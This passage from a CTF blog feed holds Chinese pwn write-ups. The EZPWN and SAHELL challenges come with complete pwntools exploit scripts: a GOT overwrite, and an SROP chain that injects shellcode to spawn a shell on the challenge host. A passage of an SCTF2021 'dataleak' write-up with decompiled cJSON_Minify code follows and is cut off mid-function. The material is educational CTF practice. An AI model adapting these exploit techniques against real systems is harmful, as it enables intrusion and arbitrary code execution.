class="line">ip_port=[<span class="string">'hsc2019.site'</span>,<span class="number">10366</span>]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> gdb_cmd=<span class="string">''</span>: gdb.attach(p,gdb_cmd) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line">debug()</span><br><span class="line">p.sendline(<span class="string">'1'</span>*<span class="number">0x40</span>+<span class="string">'2'</span>*<span class="number">8</span>+p64(e.sym[<span class="string">'backdoor'</span>]))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="EZPWN"><a href="#EZPWN" class="headerlink" title="EZPWN"></a>EZPWN</h2><p>题目给了后门。分析程序流程，发现题目有个任意执行写，篡改put函数的got表值虫二劫持got表运行后门</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   exp.py</span></span><br><span class="line"><span class="string">@Time    :   2022/02/20 11:21:21</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">1</span></span><br><span class="line">elf=<span class="string">'./EZPWN'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line">context.arch=e.arch</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">ip_port=[<span class="string">'hsc2019.site'</span>,<span class="number">10027</span>]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> gdb_cmd=<span class="string">''</span>: gdb.attach(p,gdb_cmd) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'your ID?'</span>)</span><br><span class="line">p.sendline(<span class="string">'xxxxx'</span>)</span><br><span class="line">debug()</span><br><span class="line">p.recvuntil(<span class="string">'Give me the target address?'</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x601018</span>))</span><br><span class="line">p.recvuntil(<span class="string">'Give me the data:'</span>)</span><br><span class="line">p.sendline(p64(e.sym[<span class="string">'success'</span>]))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="SAHELL"><a href="#SAHELL" class="headerlink" title="SAHELL"></a>SAHELL</h2><p>题目欺诈，实际上考的是SROT与写shell。</p><p>即及利用SPOT在一块可以控制地址区域写入shellcode，让后再调用shellcode。</p><p>但要注意的是这里连续调用两次syscall.</p><p>第一次我们利用syscall  通过SYS_rt_sigreturn 劫持栈与程序流。</p><p>但是SYS_rt_sigreturn的系统调用号为<code>0xf</code>.</p><p>因此我们用利用x64下系统调用read的返回值为输入字符数来篡改返回值（rax）为<code>0xf</code></p><p>同时，由于我们连续调用syscall，且rt_sigreturn破坏原本栈结构。我们伪造的<code>signal Frame</code>也要注意各寄存器外，<code>uc_stack</code>和<code>Segment Registers(SS, FS, GS, CS)</code>等参数也要注意实际情况。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#推荐模板：</span></span><br><span class="line">sigret_frame = [</span><br><span class="line">    p64(<span class="number">0x0000000000000007</span>),   <span class="comment"># uc_flags</span></span><br><span class="line">    p64(<span class="number">0x0000000000000000</span>),   <span class="comment"># uc_link</span></span><br><span class="line">    p64(<span class="number">0x0000000000000000</span>),   <span class="comment"># uc_stack.ss_sp</span></span><br><span class="line">    p64(<span class="number">0x0000ffff00000000</span>),   <span class="comment"># uc_stack.ss_flags</span></span><br><span class="line">    p64(<span class="number">0x0000000000000000</span>),   <span class="comment"># uc_stack.ss_size</span></span><br><span class="line">    p64(<span class="number">0xdeadbeefdeadbeef</span>),   <span class="comment"># R8</span></span><br><span class="line">    p64(<span class="number">0xdeadbeefdeadbeef</span>),   <span class="comment"># R9</span></span><br><span class="line">    p64(<span class="number">0xdeadbeefdeadbeef</span>),   <span class="comment"># R10</span></span><br><span class="line">    p64(<span class="number">0xdeadbeefdeadbeef</span>),   <span class="comment"># R11</span></span><br><span class="line">    p64(<span class="number">0xdeadbeefdeadbeef</span>),   <span class="comment"># R12</span></span><br><span class="line">    p64(<span class="number">0xdeadbeefdeadbeef</span>),   <span class="comment"># R13</span></span><br><span class="line">    p64(<span class="number">0xdeadbeefdeadbeef</span>),   <span class="comment"># R14</span></span><br><span class="line">    p64(<span class="number">0xdeadbeefdeadbeef</span>),   <span class="comment"># R15</span></span><br><span class="line">    p64(<span class="number">0x0000000000402000</span>),   <span class="comment"># RDI</span></span><br><span class="line">    p64(<span class="number">0x0000000000000000</span>),   <span class="comment"># RSI</span></span><br><span class="line">    p64(<span class="number">0xdeadbeefdeadbeef</span>),   <span class="comment"># RBP</span></span><br><span class="line">    p64(<span class="number">0xdeadbeefdeadbeef</span>),   <span class="comment"># RBX</span></span><br><span class="line">    p64(<span class="number">0x0000000000000000</span>),   <span class="comment"># RDX</span></span><br><span class="line">    p64(<span class="number">0x000000000000003b</span>),   <span class="comment"># RAX</span></span><br><span class="line">    p64(<span class="number">0xdeadbeefdeadbeef</span>),   <span class="comment"># RCX</span></span><br><span class="line">    p64(<span class="number">0xdeadbeefdeadbeef</span>),   <span class="comment"># RSP</span></span><br><span class="line">    p64(SYSCALL),   <span class="comment"># RIP = should call 'syscall' instruction</span></span><br><span class="line">    p64(<span class="number">0x0000000000000202</span>),   <span class="comment"># EFLAGS</span></span><br><span class="line">    p64(<span class="number">0x002b000000000033</span>),   <span class="comment"># Segment Registers(SS, FS, GS, CS)</span></span><br><span class="line">    p64(<span class="number">0x0000000000000000</span>),   <span class="comment"># ERR</span></span><br><span class="line">    p64(<span class="number">0x0000000000000001</span>),   <span class="comment"># TrapNo</span></span><br><span class="line">    p64(<span class="number">0x0000000000000000</span>),   <span class="comment"># Old-Mask</span></span><br><span class="line">    p64(<span class="number">0x0000000000000000</span>),   <span class="comment"># CR2</span></span><br><span class="line">    p64(<span class="number">0x0000000000000000</span>),   <span class="comment"># fpstate = NULL</span></span><br><span class="line">    p64(<span class="number">0x000000000000000e</span>),   <span class="comment"># reserved</span></span><br><span class="line">    p64(<span class="number">0x0000000000000000</span>),   <span class="comment"># uc_sigmask</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>同时，由于SYS_rt_sigreturn的返回值刚好为0，即read的系统调用号，我们就可以直接将RIP修改为syscall地址。就可以执行sys_read调用写入并指向shellcode</p><p>完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   exp.py</span></span><br><span class="line"><span class="string">@Time    :   2022/02/20 11:39:04</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">0</span></span><br><span class="line">elf=<span class="string">'./SAHELL'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line">context.arch=e.arch</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">ip_port=[<span class="string">'hsc2019.site'</span>,<span class="number">10774</span>]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> gdb_cmd=<span class="string">''</span>: gdb.attach(p,gdb_cmd) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#debug('b main')</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">shellcodeaddr=<span class="number">0x00600000</span></span><br><span class="line">rbp=shellcodeaddr</span><br><span class="line"><span class="comment">#asm(shellcraft.sh())</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">sigret_frame = [</span></span><br><span class="line"><span class="string">    p64(0x0000000000000007),   # uc_flags</span></span><br><span class="line"><span class="string">    p64(0x0000000000000000),   # uc_link</span></span><br><span class="line"><span class="string">    p64(0x0000000000000000),   # uc_stack.ss_sp</span></span><br><span class="line"><span class="string">    p64(0x0000ffff00000000),   # uc_stack.ss_flags</span></span><br><span class="line"><span class="string">    p64(0x0000000000000000),   # uc_stack.ss_size</span></span><br><span class="line"><span class="string">    p64(0xdeadbeefdeadbeef),   # R8</span></span><br><span class="line"><span class="string">    p64(0xdeadbeefdeadbeef),   # R9</span></span><br><span class="line"><span class="string">    p64(0xdeadbeefdeadbeef),   # R10</span></span><br><span class="line"><span class="string">    p64(0xdeadbeefdeadbeef),   # R11</span></span><br><span class="line"><span class="string">    p64(0xdeadbeefdeadbeef),   # R12</span></span><br><span class="line"><span class="string">    p64(0xdeadbeefdeadbeef),   # R13</span></span><br><span class="line"><span class="string">    p64(0xdeadbeefdeadbeef),   # R14</span></span><br><span class="line"><span class="string">    p64(0xdeadbeefdeadbeef),   # R15</span></span><br><span class="line"><span class="string">    p64(0x0000000000402000),   # RDI</span></span><br><span class="line"><span class="string">    p64(0x0000000000000000),   # RSI</span></span><br><span class="line"><span class="string">    p64(0xdeadbeefdeadbeef),   # RBP</span></span><br><span class="line"><span class="string">    p64(0xdeadbeefdeadbeef),   # RBX</span></span><br><span class="line"><span class="string">    p64(0x0000000000000000),   # RDX</span></span><br><span class="line"><span class="string">    p64(0x000000000000003b),   # RAX</span></span><br><span class="line"><span class="string">    p64(0xdeadbeefdeadbeef),   # RCX</span></span><br><span class="line"><span class="string">    p64(0xdeadbeefdeadbeef),   # RSP</span></span><br><span class="line"><span class="string">    p64(SYSCALL),   # RIP = should call 'syscall' instruction</span></span><br><span class="line"><span class="string">    p64(0x0000000000000202),   # EFLAGS</span></span><br><span class="line"><span class="string">    p64(0x002b000000000033),   # Segment Registers(SS, FS, GS, CS)</span></span><br><span class="line"><span class="string">    p64(0x0000000000000000),   # ERR</span></span><br><span class="line"><span class="string">    p64(0x0000000000000001),   # TrapNo</span></span><br><span class="line"><span class="string">    p64(0x0000000000000000),   # Old-Mask</span></span><br><span class="line"><span class="string">    p64(0x0000000000000000),   # CR2</span></span><br><span class="line"><span class="string">    p64(0x0000000000000000),   # fpstate = NULL</span></span><br><span class="line"><span class="string">    p64(0x000000000000000e),   # reserved</span></span><br><span class="line"><span class="string">    p64(0x0000000000000000),   # uc_sigmask</span></span><br><span class="line"><span class="string">]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'x'</span>*<span class="number">0x1a0</span>+p64(<span class="number">0x000000000400108</span><span class="number">-0x50</span>)+p64(<span class="number">0x0000000004000BA</span>)+p64(<span class="number">0x0000000004000B5</span>)+p64(<span class="number">0x0000000000000007</span>)+p64(<span class="number">0x0000000000000000</span>)+p64(<span class="number">0x0000000000000000</span>)+p64(<span class="number">0x0000ffff00000000</span>)+p64(<span class="number">0x0000000000000000</span>)+<span class="string">'a'</span>*<span class="number">0x28</span>+<span class="string">'b'</span>*<span class="number">0x10</span>+<span class="string">'c'</span>*<span class="number">8</span>+p64(<span class="number">0x0</span>)+p64(<span class="number">0x600100</span>)+<span class="string">'q'</span>*<span class="number">8</span>+<span class="string">'y'</span>*<span class="number">8</span>+p64(<span class="number">0x1000</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0x600100</span>)+p64(<span class="number">0x0000000004000CB</span>)+p64(<span class="number">0x0000000000000202</span>)+p64(<span class="number">0x002b000000000033</span>)+ p64(<span class="number">0x0000000000000000</span>)+p64(<span class="number">0x0000000000000001</span>)+p64(<span class="number">0x0000000000000000</span>)+p64(<span class="number">0x0000000000000000</span>)+p64(<span class="number">0x0000000000000000</span>)+p64(<span class="number">0x000000000000000e</span>))</span><br><span class="line">sleep(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">p.sendline(<span class="string">'1'</span>*(<span class="number">0xf</span><span class="number">-1</span>))</span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'8'</span>*<span class="number">64</span>+p64(<span class="number">0x600148</span>+<span class="number">8</span>)+p64(<span class="number">0</span>)+(asm(shellcraft.sh())))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;红客突击队ctf，好久没打ctf了，正好适合用来练手，感觉自己又变菜了……</summary>
    
    
    
    <category term="CTF" scheme="lexsd6.github.io/categories/CTF/"/>
    
    
    <category term="wp" scheme="lexsd6.github.io/tags/wp/"/>
    
    <category term="pwn" scheme="lexsd6.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>sctf2021-pwn-dataleak-wp</title>
    <link href="lexsd6.github.io/2021/12/31/sctf2021-pwn-dataleak/"/>
    <id>lexsd6.github.io/2021/12/31/sctf2021-pwn-dataleak/</id>
    <published>2021-12-31T07:16:18.287Z</published>
    <updated>2021-12-31T09:26:55.138Z</updated>
    
    <content type="html"><![CDATA[<p>周末有事去了，等缓过来只搞个这个题的文件….<a id="more"></a></p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">RPATH:    '/home/wlz/my_code/sctf_21/pwn_dataleak/src2ctfer/cmake-build-debug'</span><br></pre></td></tr></table></figure><p>分析环境，发现题目没有开启canary,并且自带一个so文件。</p><p>分析主程序流程发现逻辑很简单，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl __noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-54h]</span></span><br><span class="line">  __int64 buf; <span class="comment">// [rsp+10h] [rbp-50h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+18h] [rbp-48h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+20h] [rbp-40h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+28h] [rbp-38h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+30h] [rbp-30h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+38h] [rbp-28h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+40h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">char</span> v11; <span class="comment">// [rsp+48h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v12; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v12 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">1</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = '_si_siht';</span><br><span class="line">    v9 = '_ni_atad';</span><br><span class="line">    v10 = 'revres';</span><br><span class="line">    v11 = <span class="number">0</span>;</span><br><span class="line">    buf = <span class="number">0L</span>L;</span><br><span class="line">    v5 = <span class="number">0L</span>L;</span><br><span class="line">    v6 = <span class="number">0L</span>L;</span><br><span class="line">    v7 = <span class="number">0L</span>L;</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">0xE</span>uLL);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, &amp;v6, <span class="number">0xE</span>uLL);</span><br><span class="line">    cJSON_Minify(&amp;buf, &amp;v6);</span><br><span class="line">    <span class="built_in">write</span>(<span class="number">1</span>, &amp;v6, <span class="number">0xB</span>uLL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两次输入长度达0xe的字符串，然后放入<code>cJSON_Minify</code>函数进行处理。</p><p><code>cJSON_Minify</code>函数在so文件中源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *__fastcall <span class="title">cJSON_Minify</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// cl</span></span><br><span class="line">  <span class="keyword">char</span> *v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *v5; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// cl</span></span><br><span class="line">  _BYTE *v7; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *v8; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// cl</span></span><br><span class="line">  _BYTE *v10; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *v11; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v12; <span class="comment">// cl</span></span><br><span class="line">  _BYTE *v13; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *v14; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v15; <span class="comment">// cl</span></span><br><span class="line">  <span class="keyword">char</span> *v16; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *str_a1; <span class="comment">// [rsp+0h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> *v18; <span class="comment">// [rsp+0h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> *last; <span class="comment">// [rsp+10h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v20; <span class="comment">// [rsp+10h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  str_a1 = a1;</span><br><span class="line">  result = a1;</span><br><span class="line">  last = a1;</span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( *str_a1 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">switch</span> ( *str_a1 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">' '</span>:</span><br><span class="line">          ++str_a1;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'\t'</span>:</span><br><span class="line">          ++str_a1;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'\r'</span>:</span><br><span class="line">          ++str_a1;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'\n'</span>:</span><br><span class="line">          ++str_a1;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">          <span class="keyword">if</span> ( *str_a1 != <span class="string">'/'</span> || str_a1[<span class="number">1</span>] != <span class="string">'/'</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( *str_a1 != <span class="string">'/'</span> || str_a1[<span class="number">1</span>] != <span class="string">'*'</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">if</span> ( *str_a1 == <span class="string">'"'</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                v2 = str_a1;</span><br><span class="line">                v18 = str_a1 + <span class="number">1</span>;</span><br><span class="line">                v3 = *v2;</span><br><span class="line">                v4 = last;</span><br><span class="line">                v20 = (<span class="keyword">signed</span> __int64)(last + <span class="number">1</span>);</span><br><span class="line">                *v4 = v3;</span><br><span class="line">                <span class="keyword">while</span> ( *v18 &amp;&amp; *v18 != <span class="string">'"'</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="keyword">if</span> ( *v18 == <span class="string">'\\'</span> )</span><br><span class="line">                  &#123;</span><br><span class="line">                    v5 = v18++;</span><br><span class="line">                    v6 = *v5;</span><br><span class="line">                    v7 = (_BYTE *)v20++;</span><br><span class="line">                    *v7 = v6;</span><br><span class="line">                  &#125;</span><br><span class="line">                  v8 = v18++;</span><br><span class="line">                  v9 = *v8;</span><br><span class="line">                  v10 = (_BYTE *)v20++;</span><br><span class="line">                  *v10 = v9;</span><br><span class="line">                &#125;</span><br><span class="line">                v11 = v18;</span><br><span class="line">                str_a1 = v18 + <span class="number">1</span>;</span><br><span class="line">                v12 = *v11;</span><br><span class="line">                v13 = (_BYTE *)v20;</span><br><span class="line">                last = (<span class="keyword">char</span> *)(v20 + <span class="number">1</span>);</span><br><span class="line">                *v13 = v12;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">              &#123;</span><br><span class="line">                v14 = str_a1++;</span><br><span class="line">                v15 = *v14;</span><br><span class="line">                v16 = last++;</span><br><span class="line">                *v16 = v15;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">while</span> ( *str_a1 &amp;&amp; (*str_a1 != <span class="string">'*'</span> || str_a1[<span class="number">1</span>] != <span class="string">'/'</span>) )</span><br><span class="line">                ++str_a1;</span><br><span class="line">              str_a1 += <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">         